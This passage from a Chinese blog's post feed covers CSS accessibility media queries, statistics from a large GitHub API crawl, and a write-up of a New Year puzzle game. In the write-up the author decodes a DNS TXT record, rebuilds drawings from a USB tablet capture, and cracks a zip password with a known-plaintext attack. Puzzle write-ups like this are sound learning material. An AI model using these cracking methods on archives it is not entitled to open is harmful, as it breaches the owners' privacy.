src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/6.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1345\" height=\"1602\" class=\"aligncenter size-full wp-image-1959\"></a>\n<h2>prefers-color-scheme</h2>\n<p><code>prefers-color-scheme</code> 是最近才被浏览器广泛支持的一个媒体查询，但它的功能却很强大：<strong>响应系统级黑暗模式。</strong>这样，我们可以在开启黑暗模式的系统中让网页具有更好的可读性。不过由于这个媒体查询直到最近才被广泛支持，因此大部分网站对此并没有进行适配。</p>\n<blockquote><p>一些适配这一特性的网站：少数派、微信公众平台（文章页）等。</p></blockquote>\n<p>通过像这样的媒体查询，我们可以在系统启用黑暗模式时让页面实时响应：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    body {\r\n        background-color: #212121;\r\n        color: rgba(255, 255, 255, .7);\r\n    }\r\n}</pre>\n<p><code>prefers-color-scheme</code> 一共有 3 个可能值：<code>no-preference</code>, <code>light</code> 和 <code>dark</code>。你也可以不像上面的例子那样默认使用亮色样式并在黑暗模式下启用黑暗样式，而可以反过来将黑暗样式作为默认，用亮色样式覆盖。在不支持的浏览器上将会显示默认样式（即媒体查询不会生效）。</p>\n<p>MDx 已经在 1.9.6 版本中包含对这一媒体查询的支持。</p>\n<h2>prefers-reduced-motion</h2>\n<p>看名字就猜得出，<code>prefers-reduced-motion</code> 是和 <code>prefers-color-scheme</code> 师出同门的媒体查询。因此，和 <code>prefers-color-scheme</code> 一样，它也是在最近才获得了浏览器的广泛支持。它的作用也很强大：<strong>响应系统的“减弱动态效果”模式。</strong>这对某些不喜欢甚至无法接受动画的用户可能很有帮助。要知道，对有些用户来说这甚至是医疗上的必要。使用如下的媒体查询，我们可以在系统启用减弱动态效果模式时让页面实时响应，减弱动画：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-reduced-motion: reduce) {\r\n    /*只是一个示例，实际情况中可以保留一些淡入淡出效果*/\r\n    * {\r\n        transition: all 0s!important;\r\n        transform: none!important;\r\n    }\r\n}</pre>\n<p><code>prefers-reduced-motion</code> 只有 2 个可能值：<code>no-preference</code> 和 <code>reduce</code>，在不支持的浏览器上该媒体查询不会生效。</p>\n<p>MDx 已经在 1.9.6 版本中包含对这一媒体查询的支持。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"792\" height=\"515\" class=\"aligncenter size-full wp-image-1962\"></a>\n<h1>黑暗模式适配</h1>\n<p>黑暗模式可不是简单地切换到黑底白字这么简单。<strong>单纯地使用黑底白字会导致页面元素之间对比度过高，文字刺眼，反而降低了页面的可访问性。</strong>我在下面总结了几条应用在了 MDx 中的黑暗模式优化规则和 Google 推荐的优化规则：</p>\n<p><strong>一是避免黑底白字。</strong>黑底白字看起来真的很难受，事实上，深灰和浅灰是黑暗模式最好的配色。比较下方例子里的两段文本，毫无疑问深灰色背景和浅灰色文字搭配的样式的可读性要比黑底白字高很多。（p.s. 有时候这条规则在白底黑字时也适用）</p>\n<p><strong>二是更改部分元素的亮度和对比度以增强可读性。</strong>你可能已经注意到了，下面优化的例子里标题文字的颜色改变了。很明显，未优化的黑暗模式中标题可读性不如优化的版本。在实际中，我们通常可以通过 CSS 滤镜来实现这一更改。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    h1 {\r\n        /*反相颜色后再将色相旋转 180 度，使亮度反相*/\r\n        filter: invert(1) hue-rotate(180deg);\r\n    }\r\n}</pre>\n<p><strong>三是避免让图片过亮。</strong>未经处理的图片通常会导致过高的对比度，降低可读性。在 MDx 中，我选择降低图片的亮度来避免图片刺眼，而 Google 的建议则是使图片灰度，不过这会影响图片的整体观感。无论是哪一种方案，都可以使用 CSS 滤镜来轻松实现。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    img { \r\n        /*MDx 方案*/\r\n        filter: brightness(.8);\r\n        /*Google 方案*/\r\n        filter: grayscale(.5);\r\n    }\r\n}</pre>\n<div>\n<div>\n<h1>Cats\n</h1>\n<p>这里是未优化的黑暗模式预览。接下来，让我们来看点可爱的猫猫吧。</p>\n<p><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/demo.jpg?x-oss-process=image/interlace,1/quality,Q_90#\"></p>\n</div>\n<div>\n<h1>Cats\n</h1>\n<p>这里是经过优化的黑暗模式预览。接下来，让我们来看点可爱的猫猫吧。</p>\n<p><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/demo.jpg?x-oss-process=image/interlace,1/quality,Q_90#\"></p>\n</div>\n</div>\n<h1>其他细节</h1>\n<p>还有一些细节，虽然简单，但不可或缺。我把一部分没有在上文提到的 MDx 中的细节列在了这里。</p>\n<p><strong>一是允许页面缩放。</strong>在开发响应式页面时，很多网站会在页面头部添加这样一个 <code>meta</code>：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no\"&gt;</pre>\n<p>这样的 <code>meta</code> 设定了页面的宽度，却也固定了页面的缩放比例，用户难以手动放大网页。<strong>这样的设置对一部分视力障碍用户非常不友好</strong>，以至于苹果决定在自家的浏览器上忽略禁止缩放的 <code>meta</code>。按照 Google 的推荐，如果你在 MDx 设置中启用了“允许页面缩放”，那么 MDx 会输出这样的 <code>meta</code> 标签，允许页面进行五倍以内的缩放：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=5\"&gt;</pre>\n<p><strong>尽管很多时候放大页面会导致页面结构被破坏，但这大大增强了页面的可访问性，利大于弊。</strong>因此，在 MDx 中，“允许页面缩放”是默认启用的。</p>\n<p><strong>二是在跨设备阅读时同步阅读记录。</strong>这属于 MDx 的“元老级”功能之一。注意到页面右上角的那个“在其他设备上继续阅读”的按钮了吗？如果你滚动页面后重新点击它，你会发现二维码发生变化了。通过在二维码中记录阅读进度，用户在扫描二维码切换设备阅读时，MDx 在新设备上会自动滚动到和原设备上一致的位置——好吧，目前基于百分比的算法在某些情况下可能不太准，但我已经设计了一个更复杂但更精确的阅读进度记录算法，之后就会更新到 MDx 中。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"574\" class=\"aligncenter size-full wp-image-1976\"></a>\n<p><strong>三是避免 Web 字体阻塞渲染。</strong>如果你在页面中使用了 Web 字体，在字体加载完成之前，浏览器可能不会渲染任何文本，这就导致用户可能需要等待一段时间才能开始浏览网页。Google 推荐使用 <code>font-display: swap;</code> 来向浏览器指定网页的 Web 字体渲染策略。这一规则会提供一个比较短的等待周期，如果在这段时间内 Web 字体没有完成加载，那么浏览器会以 fallback 字体渲染文本。任意时刻一旦 Web 字体完成渲染，浏览器就会使用 Web 字体重新渲染文本。这在大多数情况下都能满足可访问性的需求。</p>\n<p><strong>四是确保 html 元素具有合适的 <code>lang</code> 属性。</strong>这一属性声明了页面的主要语言，浏览器可以据此调整渲染策略，或者触发自动翻译；屏幕阅读器也能更好地阅读网页。</p>\n<p><strong>五是确保页面主要内容在丢失/禁用了 Javascript 甚至 CSS 的情况下仍然可用。</strong>作为一个以内容为主的网站，MDx 在禁用了 Javascript 的情况下页面主要内容仍然可用。这不只是为了 SEO，更是为了保证页面的可访问性。的确，目前的情况下，如果开启了 Lazyload，MDx 在禁用 Javascript 的情况下图片的确无法显示，但我会在后续版本中尽可能的优化这一问题。</p>\n<h1>附录：媒体查询开发技巧</h1>\n<p>有的时候，光有 CSS 响应媒体查询还不够，我们可能需要在 Javascript 中实时响应媒体查询。用如下代码就可以很简单地响应媒体查询：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">let mql = window.matchMedia(\"(prefers-reduced-motion: reduce)\");\r\nmql.addListener(handleMediaChange);\r\n\r\n//在添加监听后先调用一次，获得当前查询结果\r\nhandleMediaChange(mql);\r\n\r\nfunction handleMediaChange(mql){\r\n    if(mql.matches){\r\n        //查询匹配\r\n    }else{\r\n        //查询不匹配\r\n    }\r\n}</pre>\n<p>在开发上述媒体查询的过程中，我们需要频繁地切换系统的相应模式或者调出打印窗口。<strong>实际上，Chrome 提供了更简单的调试方法：</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2333.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1946\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2333.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"723\" height=\"681\"></a>\n<p>只要在这里更改模式，相关媒体查询就能实时生效。这不会影响其他标签页，在关闭开发者工具之后也会自动恢复系统设置。</p>\n","link":"https://flyhigher.top/develop/1912.html"},{"title":"MDx Blog 现已随 MDx 1.9.5 发布","date":"2020-01-22 17:54:11","description":"<p>随着 MDx 发布 1.9.5 更新，<a href=\"https://mdxblog.flyhigher.top/\" rel=\"noopener noreferrer\" target=\"_blank\">MDx Blog</a> 现已建立。我将会在 MDx Blog 中分享一些开发故事并发布 MDx 更新日志。</p>","link":"https://flyhigher.top/diary/1905.html"},{"title":"GitHub 2019 统计无垠版","date":"2020-01-12 13:02:00","description":"\n<h1>缘起</h1>\n<p>2019 年底，我突发奇想想要自己统计一番 GitHub 上存储库的一些信息。尽管 GitHub 有自己的<a href=\"https://octoverse.github.com/\" target=\"_blank\" rel=\"noopener noreferrer\">年度统计</a>，我还是想试着自己爬取一下，说不定能挖出什么有意思的信息，何况这是我第一次有机会处理比较大量的数据，也算是一种学习的过程吧。于是花了一下午写了个简单的爬虫（时间都花在增加 Rate Limit 上了…），然后扔在了两台服务器上开始跑（GitHub  API 真是好文明）。</p>\n<p>从 2019.11.21 3 时到 2020.1.12 24 时的 52 天 21 小时内，我的爬虫一共爬取了<strong>与 2,024,705 个用户有关<sup>*</sup>的 14,651,923 个公共存储库的基础信息</strong>，平均每秒爬取 3.2 个存储库。据 GitHub 的官方数据计算，我爬取了大约 15% 的存储库信息，但由于封禁库和私有库的数量未知，我暂时无法确定我爬取的存储库占公共库的比例。同时由于存储库数量较多，基本可以认为爬取到的样本在时间尺度上已经足够随机，可以通过统计得出一般结论。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"700\" height=\"606\" class=\"aligncenter size-full wp-image-1892\"></a>\n<p>爬到自己了，合影.jpg</p>\n<p>那么下面就来看看统计出来的一些结果吧。爬虫的技术细节和数据集下载放在文末。</p>\n<p>* 指这些用户拥有至少一个库</p>\n<h1>统计信息</h1>\n<p><strong>以下统计结果均基于已放于文末的数据集。</strong>由于爬虫爬取的时间跨度长，加上我并没有完整爬取 GitHub 所有存储库，因此我<strong>不能保证以下统计结果符合真实情况</strong>，各位可以下载数据集或自行爬取进行验证。</p>\n<h2>一些数据</h2>\n<div>\n<div>\n<div>\n<span>3,120,930</span><br>总爬取用户数</div>\n<div>\n<span>44.7%</span><br>的存储库创建<br>自 Fork</div>\n<div>\n<span>6.59%</span><br>的账户被删除或<br>封禁<sup>1</sup>\n</div>\n<div>\n<span>23,913</span><br>单用户拥有最大<br>库数量<sup>2</sup>\n</div>\n</div>\n</div>\n<p><sup>1</sup> 基于用户 ID 规律合理推断<br><sup>2</sup> 统计范围仅限于当前数据集</p>\n<p>比较出乎我意料的是创建自 Fork 的存储库的占比。我预估这样的存储库占比不会太低，但没有想到能接近一半。此外单用户拥有最大库数量也大大超出了我的预期，<a href=\"https://github.com/pombredanne\" rel=\"noopener noreferrer\" target=\"_blank\">pombredanne</a> 这个用户名下拥有将近 24k 的存储库，不过绝大多数都是 Fork 来的，在情理之中。此外<strong>这个数据集中</strong>拥有最多存储库的账户其实是一个组织 <a href=\"https://github.com/gitpan\" rel=\"noopener noreferrer\" target=\"_blank\">gitpan</a>，这个组织拥有 36,377 个存储库。</p>\n<h2>语言</h2>\n<p><canvas></canvas><br>\n首先必须要说明的是，在这个榜单中我<strong>排除了 HTML 和 CSS</strong>，因为在严格意义上它们不属于“编程语言”。如果把它们计算进来的话，分别有 640,368 个和 361,425 个存储库的主要语言分别是 HTML 和 CSS，这样在这份榜单中它们可以排到第 6 和 第 10 名。JavaScript 毫无疑问获得第一，第二名 Python 的热度则和 JavaScript 相差将近一半。<strong>此外还有 2,448,486 个存储库未能识别出语言，占比 16.7%。</strong>在上面的榜单之外，与机器学习和数据科学相关的语言还有 Jupyter Notebook 排名第 13，R 排名 20，Julia 排名 43。</p>\n<p>说实话这份排名和 GitHub 官方的排名<strong>差别很大</strong>，除了前三名，后面的基本都不太一样。我的排名统计结果完全基于 GitHub 对于存储库的主要语言识别，加上我的存储库数据不完整，和官方的数据不同是很正常的，可以做一个参考，但大概率还是官方排名更加准确。</p>\n<h2>许可证</h2>\n<p><canvas></canvas></p>\n<p>自 GitHub 推出许可证功能以来，拥有许可证的存储库比例升升降降，却始终没有超过一半。<strong>选择一个合适的许可证对项目的良好发展真的很有帮助</strong>，要了解如何选择合适的许可证，请参阅<a href=\"https://www.runoob.com/w3cnote/open-source-license.html\" rel=\"noopener noreferrer\" target=\"_blank\">这篇文章</a>。</p>\n<p><canvas></canvas></p>\n<p>对于拥有许可证的存储库，MIT<del> 麻省理工许可证 </del>总是占比最大的；第二则是 Apache-2.0 许可证。此外，WTFPL 许可证也挤入了前 15 名。</p>\n<h2>星标</h2>\n<p><canvas></canvas><br>\nStar 数量毫无疑问是一个存储库受欢迎程度的体现，而 Star 数高的项目基本上大家都了解过。<strong>截至爬取结束时间</strong>，GitHub 中 Star 数最多的库是 <a href=\"https://github.com/freeCodeCamp/freeCodeCamp\" rel=\"noopener noreferrer\" target=\"_blank\">freeCodeCamp</a> <del>非常完美的驼峰命名法</del>，其次则是著名项目 <a href=\"https://github.com/996icu/996.ICU\" rel=\"noopener noreferrer\" target=\"_blank\">996.ICU</a>。<a href=\"https://github.com/vuejs/vue\" rel=\"noopener noreferrer\" target=\"_blank\">Vue</a> 现在的 Star 数已经稳压 <a href=\"https://github.com/facebook/react\" rel=\"noopener noreferrer\" target=\"_blank\">React</a> 一头，Vue YES! 此外 <a href=\"https://github.com/sindresorhus/awesome\" rel=\"noopener noreferrer\" target=\"_blank\">awesome</a> 也挤进第七名。<br><canvas></canvas><br>\n由于 Star 需要时间积累，新项目的 Star 数量很可能是比不过老项目的，这就会导致有实力的新项目无法出现在榜单中。因此我还统计了日均 Star 数，试图通过日均 Star 数来反映项目受欢迎的程度。<strong>由于正热门的项目会比老牌热门项目有优势，这一项的统计范围是 2020-01-01 之前的所有存储库。</strong>996.ICU 和 freeCodeCamp 再次出现在前 10 名，而最近的热门项目 <a href=\"https://github.com/wenyan-lang/wenyan\" rel=\"noopener noreferrer\" target=\"_blank\">wenyan</a> 则飙升至第 2 名。此外还有 <a href=\"https://github.com/menzi11/BullshitGenerator\" rel=\"noopener noreferrer\" target=\"_blank\">BullshitGenerator</a>，即最近热门的“狗屁不通文章生成器”和 <a href=\"https://github.com/evil-huawei/evil-huawei\" rel=\"noopener noreferrer\" target=\"_blank\">evil-huawei</a> 分列第 3 和第 5 名。<br><canvas></canvas><br>\n说实话这个曲线<strong>比我预估的陡多了。</strong>你可能已经注意到了，这个图表的横轴不是均匀缩放的，实际上曲线要比看起来陡很多。同时受爬取方式的影响，GitHub 中 Star 数较少的存储库数量远比我爬取到的多。也就是说，<strong>实际情况下曲线远比这个图表上的陡。</strong>拿点 Star 不容易啊。</p>\n<h2>名称</h2>\n<p><canvas></canvas><br>\n终于知道了原来存储库的名称是有长度限制的…尽管最长有 100 位，<strong>大部分人还是喜欢 8 位长的存储库名。</strong>此外 1 位长的名称也比我预估的要多一些。举几个存储库名称长度为 100 的例子吧。</p>\n<ul>\n<li>testing-something-elsetesting-something-elsetesting-something-elsetesting-something-elsetesting-some</li>\n<li>acts_as_validated_config_so_app_will_not_run_in_random_situation_and_qa_gays_will_not_cry_to_you_whe</li>\n<li>……………………………………..________-………………………………-.—……</li>\n<li>—————————————————————————————————-</li>\n<li>nyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyan</li>\n</ul>\n<p>…创造力有够丰富的。</p>\n<p><canvas></canvas></p>\n<p>最近 GitHub 上有一种奇怪的风气，那就是建立 Awesome 合集<del>骗 Star</del>。看起来 Awesome 存储库满地都是，甚至还出现了关于 Awesome 的 Awesome 合集这种迷惑行为。于是我统计了一下，<del>还好，</del>占比<del>才</del> 0.5% 不到<del>，Awesomer 们任重而道远呐</del>。</p>\n<p><canvas></canvas></p>\n<p>尽管要在 github.io 上托管网站，存储库不一定要以 .github.io 结尾，但我还是统计了一下。拥有这类存储库的用户比我预想的要少一些，看来还有很多人没有完全发挥 GitHub 的完整实力啊<del>（比如我 Doge）</del>。同时<strong>这类存储库在所有存储库中占比 1.12%</strong>，看起来不多<del>，不过至少比 Awesome 多</del>。<br><canvas></canvas><br>\n看得出来 GitHub 对于用户名长度的限制是 1-40 位。用户名最短的 27 位占据了 <code>A-Z</code> 外加 <code>-</code> 的所有可能，而用户名最长的则是一个组织 <a href=\"https://github.com/UOIT-RESEARCH-database-information-group\" rel=\"noopener noreferrer\" target=\"_blank\">UOIT-RESEARCH-database-information-group</a>。不知道是巧合还是某种规律，<strong>最受欢迎的用户名长度和存储库名称长度一样，都是 8</strong>，有点意思。</p>\n<h2>创建时间</h2>\n<p><canvas></canvas><br>\n由于我并没有完整爬取所有存储库，我只能以相对值来统计每月新增存储库数量的变化趋势。<strong>在这个图表中，我将 2017-09 的数据设为了 100%。</strong>你一定一眼就能注意到 2017 年 6,7,8 月的“一柱擎天”。<del datetime=\"2020-02-05T09:18:30+00:00\">我第一次看到这个数据的时候的确愣了一下，不过就着这条新闻看就能明白为什么了：<strong>2017 年 6 月微软收购 GitHub。</strong></del></p>\n<blockquote><p>重新确认了一下，微软收购 GitHub 比这个高峰晚了一年，目前我对这个高峰没有什么很好的解释，如果你有什么思路的话欢迎评论。</p></blockquote>\n<p><strong>需要注意的是这张图表中我排除了 Fork 存储库</strong>，因为 Fork 存储库在 API 中的创建时间是原始存储库的时间，会影响整体趋势。此外，GitHub 中还有一个创建于 2007 年 10 月 29 日的存储库，那就是 <code>id: 1</code> 的…</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"mojombo\" data-mdxgithubp=\"grit\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/mojombo/grit\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>而它的创建者正是 GitHub 的创始人之一 Tom Preston-Werner。</p>\n<h1>一些有趣的结果</h1>\n<p>当初打算自己爬的目的之一就是想看看能不能挖出什么有意思的信息，结果真的有一些不挖不知道的信息。</p>\n<h2>奇怪的存储库</h2>\n<p>在爬取到的所有存储库中，<strong>有 3 个存储库是“无主”的</strong>，即它们的 owner 属性为空。这三个存储库的基本信息如下。</p>\n<div class=\"mdui-table-fluid mdui-table-hoverable\"><table class=\"mdui-table\">\n<thead><tr>\n<th>ID</th>\n<th>名称</th>\n<th>Forked</th>\n<th>Star</th>\n<th>语言</th>\n<th>许可证</th>\n<th>创建于</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>72385291</td>\n<td>vscode-redprl</td>\n<td>否</td>\n<td>10</td>\n<td>TypeScript</td>\n<td>apache-2.0</td>\n<td>2016-10-31 08:50:01</td>\n</tr>\n<tr>\n<td>181218346</td>\n<td>electron-sys</td>\n<td>否</td>\n<td>10</td>\n<td>Rust</td>\n<td>other</td>\n<td>2019-04-14 03:20:56</td>\n</tr>\n<tr>\n<td>181391880</td>\n<td>node-sys</td>\n<td>否</td>\n<td>6</td>\n<td>Rust</td>\n<td>other</td>\n<td>2019-04-15 09:33:08</td>\n</tr>\n</tbody>\n</table></div>\n<p><strong>更奇怪的是这三个存储库“无主”的情况还不一样。</strong>第一个存储库可以通过 <code>/repositories</code> 这个 GitHub API 找到， <a href=\"https://api.github.com/repositories?since=72385290\" target=\"_blank\" rel=\"noopener noreferrer\">这个链接</a>中的第一个存储库就是它；而其余两个存储库甚至无法在 <code>/repositories</code> API 中找到。不过就算能在 API 中找到第一个存储库，它的 <code>html_url</code>，即 <code>https://github.com//vscode-redprl</code> 仍然是不可访问的。这可能是 GitHub 早期的一个 Bug 导致的，不过我仍然对爬虫是如何找到这三个存储库的以及这些 Stars 是哪里来的感到好奇。</p>\n<h2>奇怪的用户名</h2>\n<p>在爬虫爬了一段时间以后，API 中突然开始出现大量的以 fdp 开头的 18 位乱码作为用户名的用户。这些用户拥有的存储库和 starred 的存储库都为 0，而他们的 <code>html_url</code> 为 404。以下是几个例子。</p>\n<ul>\n<li>fdpEpolGCEdQX4ZlRJ</li>\n<li>fdp8XaVrdtmDZnO5pR</li>\n<li>fdp8XRAGnwAOkTr2Ya</li>\n</ul>\n<p>由于我的爬虫并没有超过 Rate Limit，所以我排除了这是污染数据的可能。我怀疑这可能是某种 Bot 账户，于是一边更新爬虫过滤掉了这些用户，一边给 GitHub 支持发邮件问了具体情况。过了两天 GitHub 回复我说这些是<strong>被自动判为可疑进而被封禁的用户</strong>（原话是 they have been flagged by our automated measures for detecting suspicious behavior）。<del>想到我正在疯狂爬取 GitHub，突然害怕.webp</del></p>\n<p>行吧。</p>\n<h1>技术细节</h1>\n<p>爬虫使用 Python3 编写，数据库使用 MySQL。爬虫共使用了 4 个 API Token，在两台服务器上分布式爬取。爬取思路为：</p>\n<ol>\n<li>通过 <code>/users</code> API 遍历用户，每个请求最多获取 30 个用户信息</li>\n<li>循环 30 个用户，分别获取 <code>/users/&lt;user_name&gt;/starred</code> 和 <code>/users/&lt;user_name&gt;/repos</code> API 中的存储库信息，每个请求最多获取 100 个存储库信息，超过 100 个的分页获取</li>\n<li>提取存储库信息，插入数据库。对于已存在的存储库，更新数据</li>\n<li>获取下 30 个用户信息</li>\n</ol>\n<p>由于爬取过程中我多次调整了爬虫逻辑，爬虫爬取到的用户 ID 区间并非连续的，具体区间为1-839586, 14800001-14885493 及 28965251-31161101。</p>\n<h1>免责声明</h1>\n<p>本站会尽可能地提供准确信息，但本站不对此文章中信息的准确性和即时性及带来的任何影响负责。</p>\n<p>本站不代表 GitHub 官方，本文仅供学习之用，请不要将本文内容直接用于任何商业项目中。</p>\n<h1>数据集下载</h1>\n<p>导出的 SQL 文件大约为 1.38GB，全部放在了 GitHub 上（在危险的边缘试探.webp</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"github-analysis-2019\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/github-analysis-2019\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>此外我也提供了 MEGA 下载，链接<a href=\"https://mega.nz/#F!juxm3A6T!7Vwpzi82W1OFrqTLu1A1pQ\">在这里</a>。</p>\n","link":"https://flyhigher.top/develop/1564.html"},{"title":"Milkice 跨年红包解谜 Writeup 及无垠跨年红包解谜答案","date":"2020-01-02 04:29:19","description":"\n<blockquote><p><del>又到了水文章的时间呢</del></p></blockquote>\n<p>先说明一下，这篇文章原本不是在计划中的，而原来说好的「在路上的两篇」文章<del>绝对不会咕</del>。我自己的红包答案本来打算直接塞在年度总结里的，结果发现稍微有些长，再加上我还花了一些时间解了<a href=\"https://milkice.me/\">奶冰</a>的红包解谜游戏，就打算把两个解谜过程放在一起单独写一篇文章。<del>真是个水文章的好理由</del>（被打死</p>\n<h1>奶<del> 子 </del>冰的红包</h1>\n<p>奶冰的红包题目比我的难多了，所以让我们先从难的开始吧。首先看一下<a href=\"https://milkice.me/2019/12/31/2019-summary/\">题目</a>：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-2.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1524\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-2.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"746\" height=\"410\"></a>\n<p>入口是 <code>happy.2020.milkice.me</code>，扔到浏览器里面表示找不到 IP，那么大概率就是 DNS 的 TXT 记录了，查一下得到 <code>nb2hi4dthixs63ljnrvwsy3ffzwwkl3tivrvezluomxxg5dsmvqw2ltqmnqxa3th</code>。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-3.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1525\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-3.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"896\" height=\"278\"></a>\n<p>第一眼没看出来是什么编码，直觉是 BaseXX 系列的编码，加上提示“不只有 Base64”，可以推断出是 Base32，转大写解码得到 <code>https://milkice.me/sEcRets/stream.pcapng</code>。是个 URL，下载得到一个 Wireshark 文件，打开一看是和某 USB 设备的通讯抓包。<del>不会做，不做了。</del></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-4.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1526\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-4.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1500\" height=\"813\"></a>\n<p>奶冰提示我“Google 上搜得到”，结合第二条提示搜索“wacom pcapng”找到了<a href=\"https://blogs.tunelko.com/2017/02/05/bitsctf-tom-and-jerry-50-points/\">这篇文章</a>（<del>这™就是答案啊</del>）。看起来是一样的套路，即通过解析数据得到数位板上画的内容，于是按文章的思路筛选出数位板发给主机的数据，导出，然后再用 tshark 导出文本数据。本来我想直接用文章中的 POC 的，结果折腾半天因为源的蜜汁原因库没装上，于是按文章中给出的数据结构自己写了段代码，分别导出 X、Y 轴数据扔进 Excel 画散点图。（<del>别问我为什么用 Excel，因为我手边没有更好的工具了</del>）</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1528\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1280\" height=\"530\"></a>\n<p><span>翻车现场之一</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-13.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1539\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-13.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"286\"></a>\n<p><span>懵逼奶冰.webp</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-1.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1533\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1500\" height=\"462\"></a>\n<p>看得出有手写文字，不过是上下颠倒的，翻转图片得 <code>https://milkice.me/2020/uso.zip</code>。是个 zip，下载打开一看，有密码。<del>不会解，不做了。</del> 第一反应是暴力解密码，但是暴力跑了 15 分钟还是没有跑出来。暴力太不优雅了，肯定不是正确思路，但奶冰什么都不肯说了。不过在这时我终于发现第一个红包口令码就藏在压缩包的注释中，Get。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-15.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1544\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-15.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"806\" height=\"593\"></a>\n<p>然而题还没解完，回去看提示，看到提供了 osu 谱面下载，于是打算不管怎么样先下载来看看。然而 osu 谱面下载要登录，只好又花了几分钟找到第三方站点，成功下载。这时候可以注意到 uso.zip 里有个同名文件（432314 Mike Greene – Bill Nye the Science Guy Theme Song (Chinese Intro).osz），可以联想到是明文攻击。好吧，上 ARCHPR，十秒解出。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-5.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1530\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"462\" height=\"643\"></a>\n<p><span>现场还原.jpg</span></p>\n<p>.osz 文件并不是明文，猜测是压缩包（和 .pptx 一个思路嘛），于是改后缀 .zip 顺利打开。然后红包口令码就藏在奶冰的 .osu 文件中了，由提示可知是明文，打开即可得到。</p>\n<a 